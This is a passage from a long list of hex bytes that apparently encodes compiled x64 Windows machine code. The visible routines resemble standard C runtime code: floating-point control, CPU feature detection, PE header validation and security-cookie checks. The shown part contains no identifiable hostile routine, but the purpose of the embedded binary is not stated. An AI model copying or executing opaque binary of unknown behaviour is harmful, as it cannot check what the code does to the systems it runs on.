0x8d, 0x54, 0x24, 0x30, 0x44, 0x89, 0x44, 0x24, 0x30, 0x4c, 0x8d, 0x4c, 0x24, 0x78, 0x4c, 0x8d, 0x44, 0x24, 0x38, 0x48, 0x89, 0x44, 0x24, 0x38, 0x48, 0x8d, 0x4c, 0x24, 0x70, 0xe8, 0xfa, 0xfe, 0xff, 0xff, 0xeb, 0x2c, 0xc6, 0x42, 0x38, 0x1, 0x45, 0x33, 0xc0, 0x44, 0x89, 0x4a, 0x34, 0x33, 0xc9, 0xc6, 0x42, 0x30, 0x1, 0x48, 0x89, 0x54, 0x24, 0x28, 0xc7, 0x42, 0x2c, 0x9, 0x0, 0x0, 0x0, 0x33, 0xd2, 0x4c, 0x89, 0x4c, 0x24, 0x20, 0xe8, 0x77, 0x94, 0xff, 0xff, 0x83, 0xc8, 0xff, 0x48, 0x83, 0xc4, 0x58, 0xc3, 0xcc, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x48, 0x89, 0x74, 0x24, 0x10, 0x57, 0x48, 0x83, 0xec, 0x20, 0x48, 0x63, 0xf9, 0x48, 0x8b, 0xf2, 0x8b, 0xcf, 0xe8, 0xe0, 0xde, 0xff, 0xff, 0x48, 0x83, 0xf8, 0xff, 0x75, 0x4, 0x33, 0xdb, 0xeb, 0x5a, 0x48, 0x8b, 0x5, 0xf3, 0xcd, 0x0, 0x0, 0xb9, 0x2, 0x0, 0x0, 0x0, 0x83, 0xff, 0x1, 0x75, 0x9, 0x40, 0x84, 0xb8, 0xc8, 0x0, 0x0, 0x0, 0x75, 0xd, 0x3b, 0xf9, 0x75, 0x20, 0xf6, 0x80, 0x80, 0x0, 0x0, 0x0, 0x1, 0x74, 0x17, 0xe8, 0xaa, 0xde, 0xff, 0xff, 0xb9, 0x1, 0x0, 0x0, 0x0, 0x48, 0x8b, 0xd8, 0xe8, 0x9d, 0xde, 0xff, 0xff, 0x48, 0x3b, 0xc3, 0x74, 0xbe, 0x8b, 0xcf, 0xe8, 0x91, 0xde, 0xff, 0xff, 0x48, 0x8b, 0xc8, 0xff, 0x15, 0x1c, 0x1d, 0x0, 0x0, 0x85, 0xc0, 0x75, 0xaa, 0xff, 0x15, 0x62, 0x1b, 0x0, 0x0, 0x8b, 0xd8, 0x8b, 0xcf, 0xe8, 0xb9, 0xdd, 0xff, 0xff, 0x48, 0x8b, 0xd7, 0x4c, 0x8d, 0x5, 0x8f, 0xcd, 0x0, 0x0, 0x83, 0xe2, 0x3f, 0x48, 0x8b, 0xcf, 0x48, 0xc1, 0xf9, 0x6, 0x48, 0x8d, 0x14, 0xd2, 0x49, 0x8b, 0xc, 0xc8, 0xc6, 0x44, 0xd1, 0x38, 0x0, 0x85, 0xdb, 0x74, 0xf, 0x48, 0x8b, 0xd6, 0x8b, 0xcb, 0xe8, 0x7e, 0x95, 0xff, 0xff, 0x83, 0xc8, 0xff, 0xeb, 0x2, 0x33, 0xc0, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x48, 0x8b, 0x74, 0x24, 0x38, 0x48, 0x83, 0xc4, 0x20, 0x5f, 0xc3, 0xcc, 0xcc, 0xcc, 0x83, 0x49, 0x18, 0xff, 0x33, 0xc0, 0x48, 0x89, 0x1, 0x48, 0x89, 0x41, 0x8, 0x89, 0x41, 0x10, 0x48, 0x89, 0x41, 0x1c, 0x48, 0x89, 0x41, 0x28, 0x87, 0x41, 0x14, 0xc3, 0x48, 0x8b, 0xc4, 0x53, 0x48, 0x83, 0xec, 0x50, 0xf2, 0xf, 0x10, 0x84, 0x24, 0x80, 0x0, 0x0, 0x0, 0x8b, 0xd9, 0xf2, 0xf, 0x10, 0x8c, 0x24, 0x88, 0x0, 0x0, 0x0, 0xba, 0xc0, 0xff, 0x0, 0x0, 0x89, 0x48, 0xc8, 0x48, 0x8b, 0x8c, 0x24, 0x90, 0x0, 0x0, 0x0, 0xf2, 0xf, 0x11, 0x40, 0xe0, 0xf2, 0xf, 0x11, 0x48, 0xe8, 0xf2, 0xf, 0x11, 0x58, 0xd8, 0x4c, 0x89, 0x40, 0xd0, 0xe8, 0x28, 0x7, 0x0, 0x0, 0x48, 0x8d, 0x4c, 0x24, 0x20, 0xe8, 0x96, 0xbd, 0xff, 0xff, 0x85, 0xc0, 0x75, 0x7, 0x8b, 0xcb, 0xe8, 0xc3, 0x6, 0x0, 0x0, 0xf2, 0xf, 0x10, 0x44, 0x24, 0x40, 0x48, 0x83, 0xc4, 0x50, 0x5b, 0xc3, 0xcc, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x48, 0x89, 0x74, 0x24, 0x10, 0x57, 0x48, 0x83, 0xec, 0x20, 0x8b, 0xd9, 0x48, 0x8b, 0xf2, 0x83, 0xe3, 0x1f, 0x8b, 0xf9, 0xf6, 0xc1, 0x8, 0x74, 0x14, 0x40, 0x84, 0xf6, 0x79, 0xf, 0xb9, 0x1, 0x0, 0x0, 0x0, 0xe8, 0x53, 0x7, 0x0, 0x0, 0x83, 0xe3, 0xf7, 0xeb, 0x57, 0xb9, 0x4, 0x0, 0x0, 0x0, 0x40, 0x84, 0xf9, 0x74, 0x11, 0x48, 0xf, 0xba, 0xe6, 0x9, 0x73, 0xa, 0xe8, 0x38, 0x7, 0x0, 0x0, 0x83, 0xe3, 0xfb, 0xeb, 0x3c, 0x40, 0xf6, 0xc7, 0x1, 0x74, 0x16, 0x48, 0xf, 0xba, 0xe6, 0xa, 0x73, 0xf, 0xb9, 0x8, 0x0, 0x0, 0x0, 0xe8, 0x1c, 0x7, 0x0, 0x0, 0x83, 0xe3, 0xfe, 0xeb, 0x20, 0x40, 0xf6, 0xc7, 0x2, 0x74, 0x1a, 0x48, 0xf, 0xba, 0xe6, 0xb, 0x73, 0x13, 0x40, 0xf6, 0xc7, 0x10, 0x74, 0xa, 0xb9, 0x10, 0x0, 0x0, 0x0, 0xe8, 0xfa, 0x6, 0x0, 0x0, 0x83, 0xe3, 0xfd, 0x40, 0xf6, 0xc7, 0x10, 0x74, 0x14, 0x48, 0xf, 0xba, 0xe6, 0xc, 0x73, 0xd, 0xb9, 0x20, 0x0, 0x0, 0x0, 0xe8, 0xe0, 0x6, 0x0, 0x0, 0x83, 0xe3, 0xef, 0x48, 0x8b, 0x74, 0x24, 0x38, 0x33, 0xc0, 0x85, 0xdb, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0xf, 0x94, 0xc0, 0x48, 0x83, 0xc4, 0x20, 0x5f, 0xc3, 0xcc, 0xcc, 0x48, 0x8b, 0xc4, 0x55, 0x53, 0x56, 0x57, 0x41, 0x56, 0x48, 0x8d, 0x68, 0xc9, 0x48, 0x81, 0xec, 0xe0, 0x0, 0x0, 0x0, 0xf, 0x29, 0x70, 0xc8, 0x48, 0x8b, 0x5, 0x1, 0xba, 0x0, 0x0, 0x48, 0x33, 0xc4, 0x48, 0x89, 0x45, 0xef, 0x8b, 0xf2, 0x4c, 0x8b, 0xf1, 0xba, 0xc0, 0xff, 0x0, 0x0, 0xb9, 0x80, 0x1f, 0x0, 0x0, 0x41, 0x8b, 0xf9, 0x49, 0x8b, 0xd8, 0xe8, 0x8, 0x6, 0x0, 0x0, 0x8b, 0x4d, 0x5f, 0x48, 0x89, 0x44, 0x24, 0x48, 0x48, 0x89, 0x5c, 0x24, 0x40, 0xf2, 0xf, 0x10, 0x44, 0x24, 0x40, 0x48, 0x8b, 0x54, 0x24, 0x48, 0xf2, 0xf, 0x11, 0x44, 0x24, 0x40, 0xe8, 0xe1, 0xfe, 0xff, 0xff, 0xf2, 0xf, 0x10, 0x75, 0x77, 0x85, 0xc0, 0x75, 0x40, 0x83, 0x7d, 0x7f, 0x2, 0x75, 0x11, 0x8b, 0x45, 0xbf, 0x83, 0xe0, 0xe3, 0xf2, 0xf, 0x11, 0x75, 0xaf, 0x83, 0xc8, 0x3, 0x89, 0x45, 0xbf, 0x44, 0x8b, 0x45, 0x5f, 0x48, 0x8d, 0x44, 0x24, 0x40, 0x48, 0x89, 0x44, 0x24, 0x28, 0x48, 0x8d, 0x54, 0x24, 0x48, 0x48, 0x8d, 0x45, 0x6f, 0x44, 0x8b, 0xce, 0x48, 0x8d, 0x4c, 0x24, 0x50, 0x48, 0x89, 0x44, 0x24, 0x20, 0xe8, 0x14, 0x2, 0x0, 0x0, 0xe8, 0xe7, 0xbb, 0xff, 0xff, 0x84, 0xc0, 0x74, 0x34, 0x85, 0xff, 0x74, 0x30, 0x48, 0x8b, 0x44, 0x24, 0x48, 0x4d, 0x8b, 0xc6, 0xf2, 0xf, 0x10, 0x44, 0x24, 0x40, 0x8b, 0xcf, 0xf2, 0xf, 0x10, 0x5d, 0x6f, 0x8b, 0x55, 0x67, 0x48, 0x89, 0x44, 0x24, 0x30, 0xf2, 0xf, 0x11, 0x44, 0x24, 0x28, 0xf2, 0xf, 0x11, 0x74, 0x24, 0x20, 0xe8, 0xf5, 0xfd, 0xff, 0xff, 0xeb, 0x1c, 0x8b, 0xcf, 0xe8, 0x8, 0x5, 0x0, 0x0, 0x48, 0x8b, 0x4c, 0x24, 0x48, 0xba, 0xc0, 0xff, 0x0, 0x0, 0xe8, 0x49, 0x5, 0x0, 0x0, 0xf2, 0xf, 0x10, 0x44, 0x24, 0x40, 0x48, 0x8b, 0x4d, 0xef, 0x48, 0x33, 0xcc, 0xe8, 0x7f, 0x7, 0x0, 0x0, 0xf, 0x28, 0xb4, 0x24, 0xd0, 0x0, 0x0, 0x0, 0x48, 0x81, 0xc4, 0xe0, 0x0, 0x0, 0x0, 0x41, 0x5e, 0x5f, 0x5e, 0x5b, 0x5d, 0xc3, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0x40, 0x53, 0x48, 0x83, 0xec, 0x10, 0x45, 0x33, 0xc0, 0x33, 0xc9, 0x44, 0x89, 0x5, 0x56, 0xcf, 0x0, 0x0, 0x45, 0x8d, 0x48, 0x1, 0x41, 0x8b, 0xc1, 0xf, 0xa2, 0x89, 0x4, 0x24, 0xb8, 0x0, 0x10, 0x0, 0x18, 0x89, 0x4c, 0x24, 0x8, 0x23, 0xc8, 0x89, 0x5c, 0x24, 0x4, 0x89, 0x54, 0x24, 0xc, 0x3b, 0xc8, 0x75, 0x2c, 0x33, 0xc9, 0xf, 0x1, 0xd0, 0x48, 0xc1, 0xe2, 0x20, 0x48, 0xb, 0xd0, 0x48, 0x89, 0x54, 0x24, 0x20, 0x48, 0x8b, 0x44, 0x24, 0x20, 0x44, 0x8b, 0x5, 0x16, 0xcf, 0x0, 0x0, 0x24, 0x6, 0x3c, 0x6, 0x45, 0xf, 0x44, 0xc1, 0x44, 0x89, 0x5, 0x7, 0xcf, 0x0, 0x0, 0x44, 0x89, 0x5, 0x4, 0xcf, 0x0, 0x0, 0x33, 0xc0, 0x48, 0x83, 0xc4, 0x10, 0x5b, 0xc3, 0x48, 0x83, 0xec, 0x38, 0x48, 0x8d, 0x5, 0xd5, 0x8e, 0x0, 0x0, 0x41, 0xb9, 0x1b, 0x0, 0x0, 0x0, 0x48, 0x89, 0x44, 0x24, 0x20, 0xe8, 0x5, 0x0, 0x0, 0x0, 0x48, 0x83, 0xc4, 0x38, 0xc3, 0x48, 0x8b, 0xc4, 0x48, 0x83, 0xec, 0x68, 0xf, 0x29, 0x70, 0xe8, 0xf, 0x28, 0xf1, 0x41, 0x8b, 0xd1, 0xf, 0x28, 0xd8, 0x41, 0x83, 0xe8, 0x1, 0x74, 0x2a, 0x41, 0x83, 0xf8, 0x1, 0x75, 0x69, 0x44, 0x89, 0x40, 0xd8, 0xf, 0x57, 0xd2, 0xf2, 0xf, 0x11, 0x50, 0xd0, 0x45, 0x8b, 0xc8, 0xf2, 0xf, 0x11, 0x40, 0xc8, 0xc7, 0x40, 0xc0, 0x21, 0x0, 0x0, 0x0, 0xc7, 0x40, 0xb8, 0x8, 0x0, 0x0, 0x0, 0xeb, 0x2d, 0xc7, 0x44, 0x24, 0x40, 0x1, 0x0, 0x0, 0x0, 0xf, 0x57, 0xc0, 0xf2, 0xf, 0x11, 0x44, 0x24, 0x38, 0x41, 0xb9, 0x2, 0x0, 0x0, 0x0, 0xf2, 0xf, 0x11, 0x5c, 0x24, 0x30, 0xc7, 0x44, 0x24, 0x28, 0x22, 0x0, 0x0, 0x0, 0xc7, 0x44, 0x24, 0x20, 0x4, 0x0, 0x0, 0x0, 0x48, 0x8b, 0x8c, 0x24, 0x90, 0x0, 0x0, 0x0, 0xf2, 0xf, 0x11, 0x74, 0x24, 0x78, 0x4c, 0x8b, 0x44, 0x24, 0x78, 0xe8, 0xb7, 0xfd, 0xff, 0xff, 0xf, 0x28, 0xc6, 0xf, 0x28, 0x74, 0x24, 0x50, 0x48, 0x83, 0xc4, 0x68, 0xc3, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0x66, 0x66, 0xf, 0x1f, 0x84, 0x0, 0x0, 0x0, 0x0, 0x0, 0x48, 0x83, 0xec, 0x8, 0xf, 0xae, 0x1c, 0x24, 0x8b, 0x4, 0x24, 0x48, 0x83, 0xc4, 0x8, 0xc3, 0x89, 0x4c, 0x24, 0x8, 0xf, 0xae, 0x54, 0x24, 0x8, 0xc3, 0xf, 0xae, 0x5c, 0x24, 0x8, 0xb9, 0xc0, 0xff, 0xff, 0xff, 0x21, 0x4c, 0x24, 0x8, 0xf, 0xae, 0x54, 0x24, 0x8, 0xc3, 0x66, 0xf, 0x2e, 0x5, 0xea, 0x8d, 0x0, 0x0, 0x73, 0x14, 0x66, 0xf, 0x2e, 0x5, 0xe8, 0x8d, 0x0, 0x0, 0x76, 0xa, 0xf2, 0x48, 0xf, 0x2d, 0xc8, 0xf2, 0x48, 0xf, 0x2a, 0xc1, 0xc3, 0xcc, 0xcc, 0xcc, 0x48, 0x83, 0xec, 0x48, 0x83, 0x64, 0x24, 0x30, 0x0, 0x48, 0x8b, 0x44, 0x24, 0x78, 0x48, 0x89, 0x44, 0x24, 0x28, 0x48, 0x8b, 0x44, 0x24, 0x70, 0x48, 0x89, 0x44, 0x24, 0x20, 0xe8, 0x6, 0x0, 0x0, 0x0, 0x48, 0x83, 0xc4, 0x48, 0xc3, 0xcc, 0x48, 0x8b, 0xc4, 0x48, 0x89, 0x58, 0x10, 0x48, 0x89, 0x70, 0x18, 0x48, 0x89, 0x78, 0x20, 0x48, 0x89, 0x48, 0x8, 0x55, 0x48, 0x8b, 0xec, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0xda, 0x41, 0x8b, 0xf1, 0x33, 0xd2, 0xbf, 0xd, 0x0, 0x0, 0xc0, 0x89, 0x51, 0x4, 0x48, 0x8b, 0x45, 0x10, 0x89, 0x50, 0x8, 0x48, 0x8b, 0x45, 0x10, 0x89, 0x50, 0xc, 0x41, 0xf6, 0xc0, 0x10, 0x74, 0xd, 0x48, 0x8b, 0x45, 0x10, 0xbf, 0x8f, 0x0, 0x0, 0xc0, 0x83, 0x48, 0x4, 0x1, 0x41, 0xf6, 0xc0, 0x2, 0x74, 0xd, 0x48, 0x8b, 0x45, 0x10, 0xbf, 0x93, 0x0, 0x0, 0xc0, 0x83, 0x48, 0x4, 0x2, 0x41, 0xf6, 0xc0, 0x1, 0x74, 0xd, 0x48, 0x8b, 0x45, 0x10, 0xbf, 0x91, 0x0, 0x0, 0xc0, 0x83, 0x48, 0x4, 0x4, 0x41, 0xf6, 0xc0, 0x4, 0x74, 0xd, 0x48, 0x8b, 0x45, 0x10, 0xbf, 0x8e, 0x0, 0x0, 0xc0, 0x83, 0x48, 0x4, 0x8, 0x41, 0xf6, 0xc0, 0x8, 0x74, 0xd, 0x48, 0x8b, 0x45, 0x10, 0xbf, 0x90, 0x0, 0x0, 0xc0, 0x83, 0x48, 0x4, 0x10, 0x48, 0x8b, 0x4d, 0x10, 0x48, 0x8b, 0x3, 0x48, 0xc1, 0xe8, 0x7, 0xc1, 0xe0, 0x4, 0xf7, 0xd0, 0x33, 0x41, 0x8, 0x83, 0xe0, 0x10, 0x31, 0x41, 0x8, 0x48, 0x8b, 0x4d, 0x10, 0x48, 0x8b, 0x3, 0x48, 0xc1, 0xe8, 0x9, 0xc1, 0xe0, 0x3, 0xf7, 0xd0, 0x33, 0x41, 0x8, 0x83, 0xe0, 0x8, 0x31, 0x41, 0x8, 0x48, 0x8b, 0x4d, 0x10, 0x48, 0x8b, 0x3, 0x48, 0xc1, 0xe8, 0xa, 0xc1, 0xe0, 0x2, 0xf7, 0xd0, 0x33, 0x41, 0x8, 0x83, 0xe0, 0x4, 0x31, 0x41, 0x8, 0x48, 0x8b, 0x4d, 0x10, 0x48, 0x8b, 0x3, 0x48, 0xc1, 0xe8, 0xb, 0x3, 0xc0, 0xf7, 0xd0, 0x33, 0x41, 0x8, 0x83, 0xe0, 0x2, 0x31, 0x41, 0x8, 0x8b, 0x3, 0x48, 0x8b, 0x4d, 0x10, 0x48, 0xc1, 0xe8, 0xc, 0xf7, 0xd0, 0x33, 0x41, 0x8, 0x83, 0xe0, 0x1, 0x31, 0x41, 0x8, 0xe8, 0xe7, 0x2, 0x0, 0x0, 0x48, 0x8b, 0xd0, 0xa8, 0x1, 0x74, 0x8, 0x48, 0x8b, 0x4d, 0x10, 0x83, 0x49, 0xc, 0x10, 0xf6, 0xc2, 0x4, 0x74, 0x8, 0x48, 0x8b, 0x4d, 0x10, 0x83, 0x49, 0xc, 0x8, 0xf6, 0xc2, 0x8, 0x74, 0x8, 0x48, 0x8b, 0x45, 0x10, 0x83, 0x48, 0xc, 0x4, 0xf6, 0xc2, 0x10, 0x74, 0x8, 0x48, 0x8b, 0x45, 0x10, 0x83, 0x48, 0xc, 0x2, 0xf6, 0xc2, 0x20, 0x74, 0x8, 0x48, 0x8b, 0x45, 0x10, 0x83, 0x48, 0xc, 0x1, 0x8b, 0x3, 0xb9, 0x0, 0x60, 0x0, 0x0, 0x48, 0x23, 0xc1, 0x74, 0x3e, 0x48, 0x3d, 0x0, 0x20, 0x0, 0x0, 0x74, 0x26, 0x48, 0x3d, 0x0, 0x40, 0x0, 0x0, 0x74, 0xe, 0x48, 0x3b, 0xc1, 0x75, 0x30, 0x48, 0x8b, 0x45, 0x10, 0x83, 0x8, 0x3, 0xeb, 0x27, 0x48, 0x8b, 0x45, 0x10, 0x83, 0x20, 0xfe, 0x48, 0x8b, 0x45, 0x10, 0x83, 0x8, 0x2, 0xeb, 0x17, 0x48, 0x8b, 0x45, 0x10, 0x83, 0x20, 0xfd, 0x48, 0x8b, 0x45, 0x10, 0x83, 0x8, 0x1, 0xeb, 0x7, 0x48, 0x8b, 0x45, 0x10, 0x83, 0x20, 0xfc, 0x48, 0x8b, 0x45, 0x10, 0x81, 0xe6, 0xff, 0xf, 0x0, 0x0, 0xc1, 0xe6, 0x5, 0x81, 0x20, 0x1f, 0x0, 0xfe, 0xff, 0x48, 0x8b, 0x45, 0x10, 0x9, 0x30, 0x48, 0x8b, 0x45, 0x10, 0x48, 0x8b, 0x75, 0x38, 0x83, 0x48, 0x20, 0x1, 0x83, 0x7d, 0x40, 0x0, 0x74, 0x33, 0x48, 0x8b, 0x45, 0x10, 0xba, 0xe1, 0xff, 0xff, 0xff, 0x21, 0x50, 0x20, 0x48, 0x8b, 0x45, 0x30, 0x8b, 0x8, 0x48, 0x8b, 0x45, 0x10, 0x89, 0x48, 0x10, 0x48, 0x8b, 0x45, 0x10, 0x83, 0x48, 0x60, 0x1, 0x48, 0x8b, 0x45, 0x10, 0x21, 0x50, 0x60, 0x48, 0x8b, 0x45, 0x10, 0x8b, 0xe, 0x89, 0x48, 0x50, 0xeb, 0x48, 0x48, 0x8b, 0x4d, 0x10, 0x41, 0xb8, 0xe3, 0xff, 0xff, 0xff, 0x8b, 0x41, 0x20, 0x41, 0x23, 0xc0, 0x83, 0xc8, 0x2, 0x89, 0x41, 0x20, 0x48, 0x8b, 0x45, 0x30, 0x48, 0x8b, 0x8, 0x48, 0x8b, 0x45, 0x10, 0x48, 0x89, 0x48, 0x10, 0x48, 0x8b, 0x45, 0x10, 0x83, 0x48, 0x60, 0x1, 0x48, 0x8b, 0x55, 0x10, 0x8b, 0x42, 0x60, 0x41, 0x23, 0xc0, 0x83, 0xc8, 0x2, 0x89, 0x42, 0x60, 0x48, 0x8b, 0x45, 0x10, 0x48, 0x8b, 0x16, 0x48, 0x89, 0x50, 0x50, 0xe8, 0xec, 0x0, 0x0, 0x0, 0x33, 0xd2, 0x4c, 0x8d, 0x4d, 0x10, 0x8b, 0xcf, 0x44, 0x8d, 0x42, 0x1, 0xff, 0x15, 0xf2, 0x14, 0x0, 0x0, 0x48, 0x8b, 0x4d, 0x10, 0x8b, 0x41, 0x8, 0xa8, 0x10, 0x74, 0x8, 0x48, 0xf, 0xba, 0x33, 0x7, 0x8b, 0x41, 0x8, 0xa8, 0x8, 0x74, 0x8, 0x48, 0xf, 0xba, 0x33, 0x9, 0x8b, 0x41, 0x8, 0xa8, 0x4, 0x74, 0x8, 0x48, 0xf, 0xba, 0x33, 0xa, 0x8b, 0x41, 0x8, 0xa8, 0x2, 0x74, 0x8, 0x48, 0xf, 0xba, 0x33, 0xb, 0x8b, 0x41, 0x8, 0xa8, 0x1, 0x74, 0x5, 0x48, 0xf, 0xba, 0x33, 0xc, 0x8b, 0x1, 0x83, 0xe0, 0x3, 0x74, 0x30, 0x83, 0xe8, 0x1, 0x74, 0x1f, 0x83, 0xe8, 0x1, 0x74, 0xe, 0x83, 0xf8, 0x1, 0x75, 0x28, 0x48, 0x81, 0xb, 0x0, 0x60, 0x0, 0x0, 0xeb, 0x1f, 0x48, 0xf, 0xba, 0x33, 0xd, 0x48, 0xf, 0xba, 0x2b, 0xe, 0xeb, 0x13, 0x48, 0xf, 0xba, 0x33, 0xe, 0x48, 0xf, 0xba, 0x2b, 0xd, 0xeb, 0x7, 0x48, 0x81, 0x23, 0xff, 0x9f, 0xff, 0xff, 0x83, 0x7d, 0x40, 0x0, 0x74, 0x7, 0x8b, 0x41, 0x50, 0x89, 0x6, 0xeb, 0x7, 0x48, 0x8b, 0x41, 0x50, 0x48, 0x89, 0x6, 0x48, 0x8b, 0x5c, 0x24, 0x38, 0x48, 0x8b, 0x74, 0x24, 0x40, 0x48, 0x8b, 0x7c, 0x24, 0x48, 0x48, 0x83, 0xc4, 0x20, 0x5d, 0xc3, 0xcc, 0xcc, 0xcc, 0x48, 0x83, 0xec, 0x28, 0x83, 0xf9, 0x1, 0x74, 0x15, 0x8d, 0x41, 0xfe, 0x83, 0xf8, 0x1, 0x77, 0x18, 0xe8, 0x5a, 0x8e, 0xff, 0xff, 0xc7, 0x0, 0x22, 0x0, 0x0, 0x0, 0xeb, 0xb, 0xe8, 0x4d, 0x8e, 0xff, 0xff, 0xc7, 0x0, 0x21, 0x0, 0x0, 0x0, 0x48, 0x83, 0xc4, 0x28, 0xc3, 0xcc, 0xcc, 0x40, 0x53, 0x48, 0x83, 0xec, 0x20, 0xe8, 0x3d, 0xfc, 0xff, 0xff, 0x8b, 0xd8, 0x83, 0xe3, 0x3f, 0xe8, 0x4d, 0xfc, 0xff, 0xff, 0x8b, 0xc3, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0xc3, 0xcc, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x18, 0x48, 0x89, 0x74, 0x24, 0x20, 0x57, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0xda, 0x48, 0x8b, 0xf9, 0xe8, 0xe, 0xfc, 0xff, 0xff, 0x8b, 0xf0, 0x89, 0x44, 0x24, 0x38, 0x8b, 0xcb, 0xf7, 0xd1, 0x81, 0xc9, 0x7f, 0x80, 0xff, 0xff, 0x23, 0xc8, 0x23, 0xfb, 0xb, 0xcf, 0x89, 0x4c, 0x24, 0x30, 0x80, 0x3d, 0x5d, 0xbd, 0x0, 0x0, 0x0, 0x74, 0x25, 0xf6, 0xc1, 0x40, 0x74, 0x20, 0xe8, 0xf1, 0xfb, 0xff, 0xff, 0xeb, 0x21, 0xc6, 0x5, 0x48, 0xbd, 0x0, 0x0, 0x0, 0x8b, 0x4c, 0x24, 0x30, 0x83, 0xe1, 0xbf, 0xe8, 0xdc, 0xfb, 0xff, 0xff, 0x8b, 0x74, 0x24, 0x38, 0xeb, 0x8, 0x83, 0xe1, 0xbf, 0xe8, 0xce, 0xfb, 0xff, 0xff, 0x8b, 0xc6, 0x48, 0x8b, 0x5c, 0x24, 0x40, 0x48, 0x8b, 0x74, 0x24, 0x48, 0x48, 0x83, 0xc4, 0x20, 0x5f, 0xc3, 0x40, 0x53, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0xd9, 0xe8, 0x9e, 0xfb, 0xff, 0xff, 0x83, 0xe3, 0x3f, 0xb, 0xc3, 0x8b, 0xc8, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0xe9, 0x9d, 0xfb, 0xff, 0xff, 0xcc, 0x48, 0x83, 0xec, 0x28, 0xe8, 0x83, 0xfb, 0xff, 0xff, 0x83, 0xe0, 0x3f, 0x48, 0x83, 0xc4, 0x28, 0xc3, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0x4c, 0x63, 0x41, 0x3c, 0x45, 0x33, 0xc9, 0x4c, 0x3, 0xc1, 0x4c, 0x8b, 0xd2, 0x41, 0xf, 0xb7, 0x40, 0x14, 0x45, 0xf, 0xb7, 0x58, 0x6, 0x48, 0x83, 0xc0, 0x18, 0x49, 0x3, 0xc0, 0x45, 0x85, 0xdb, 0x74, 0x1e, 0x8b, 0x50, 0xc, 0x4c, 0x3b, 0xd2, 0x72, 0xa, 0x8b, 0x48, 0x8, 0x3, 0xca, 0x4c, 0x3b, 0xd1, 0x72, 0xe, 0x41, 0xff, 0xc1, 0x48, 0x83, 0xc0, 0x28, 0x45, 0x3b, 0xcb, 0x72, 0xe2, 0x33, 0xc0, 0xc3, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x57, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0xd9, 0x48, 0x8d, 0x3d, 0x7c, 0x21, 0xff, 0xff, 0x48, 0x8b, 0xcf, 0xe8, 0x34, 0x0, 0x0, 0x0, 0x85, 0xc0, 0x74, 0x22, 0x48, 0x2b, 0xdf, 0x48, 0x8b, 0xd3, 0x48, 0x8b, 0xcf, 0xe8, 0x82, 0xff, 0xff, 0xff, 0x48, 0x85, 0xc0, 0x74, 0xf, 0x8b, 0x40, 0x24, 0xc1, 0xe8, 0x1f, 0xf7, 0xd0, 0x83, 0xe0, 0x1, 0xeb, 0x2, 0x33, 0xc0, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x48, 0x83, 0xc4, 0x20, 0x5f, 0xc3, 0xcc, 0xcc, 0xcc, 0xb8, 0x4d, 0x5a, 0x0, 0x0, 0x66, 0x39, 0x1, 0x75, 0x20, 0x48, 0x63, 0x41, 0x3c, 0x48, 0x3, 0xc1, 0x81, 0x38, 0x50, 0x45, 0x0, 0x0, 0x75, 0x11, 0xb9, 0xb, 0x2, 0x0, 0x0, 0x66, 0x39, 0x48, 0x18, 0x75, 0x6, 0xb8, 0x1, 0x0, 0x0, 0x0, 0xc3, 0x33, 0xc0, 0xc3, 0xcc, 0xcc, 0xcc, 0x40, 0x53, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8d, 0x5, 0xcb, 0x88, 0x0, 0x0, 0x48, 0x8b, 0xd9, 0x48, 0x89, 0x1, 0xf6, 0xc2, 0x1, 0x74, 0xa, 0xba, 0x18, 0x0, 0x0, 0x0, 0xe8, 0xbe, 0x0, 0x0, 0x0, 0x48, 0x8b, 0xc3, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0xc3, 0xcc, 0x48, 0x83, 0xec, 0x28, 0x4d, 0x8b, 0x41, 0x38, 0x48, 0x8b, 0xca, 0x49, 0x8b, 0xd1, 0xe8, 0xd, 0x0, 0x0, 0x0, 0xb8, 0x1, 0x0, 0x0, 0x0, 0x48, 0x83, 0xc4, 0x28, 0xc3, 0xcc, 0xcc, 0xcc, 0x40, 0x53, 0x45, 0x8b, 0x18, 0x48, 0x8b, 0xda, 0x41, 0x83, 0xe3, 0xf8, 0x4c, 0x8b, 0xc9, 0x41, 0xf6, 0x0, 0x4, 0x4c, 0x8b, 0xd1, 0x74, 0x13, 0x41, 0x8b, 0x40, 0x8, 0x4d, 0x63, 0x50, 0x4, 0xf7, 0xd8, 0x4c, 0x3, 0xd1, 0x48, 0x63, 0xc8, 0x4c, 0x23, 0xd1, 0x49, 0x63, 0xc3, 0x4a, 0x8b, 0x14, 0x10, 0x48, 0x8b, 0x43, 0x10, 0x8b, 0x48, 0x8, 0x48, 0x8b, 0x43, 0x8, 0xf6, 0x44, 0x1, 0x3, 0xf, 0x74, 0xb, 0xf, 0xb6, 0x44, 0x1, 0x3, 0x83, 0xe0, 0xf0, 0x4c, 0x3, 0xc8, 0x4c, 0x33, 0xca, 0x49, 0x8b, 0xc9, 0x5b, 0xe9, 0x19, 0x0, 0x0, 0x0, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0x66, 0x66, 0xf, 0x1f, 0x84, 0x0, 0x0, 0x0, 0x0, 0x0, 0x48, 